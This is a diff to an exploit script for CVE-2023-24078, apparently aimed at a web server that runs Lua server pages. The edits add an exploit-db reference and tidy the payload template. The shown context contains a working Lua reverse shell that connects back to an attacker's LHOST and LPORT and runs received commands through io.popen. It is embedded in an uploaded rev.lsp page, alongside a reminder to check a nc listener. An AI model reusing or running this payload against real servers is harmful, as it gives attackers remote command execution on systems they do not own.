@@ -6,6 +6,9 @@
 # Version: 8.1
 # Tested on: Ubuntu 22.04.1
 # CVE : CVE-2023-24078
+# https://www.exploit-db.com/exploits/51550
+
+
 
 import requests
 from bs4 import BeautifulSoup
@@ -44,6 +47,9 @@ if args.sport != None:
     sport = args.sport
 else:
     sport = 443
+
+
+
 
 
 
@@ -125,16 +131,16 @@ def exploit(r, s):
     shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 
     file_content = f'''
-	<h2> Check ur nc listener on the port you put in <h2>
+    	<h2> Check ur nc listener on the port you put in <h2>
 
-	<?lsp if request:method() == "GET" then ?>
-		<?lsp 
-        {shell}		
-		?>set
-	<?lsp else ?>
-		Wrong request method, goodBye! 
-	<?lsp end ?>
-	'''
+    	<?lsp if request:method() == "GET" then ?>
+    		<?lsp 
+            {shell}		
+    		?>
+    	<?lsp else ?>
+    		Wrong request method, goodBye! 
+    	<?lsp end ?>
+    	'''
 
     luaFile = 'rev.lsp'
 
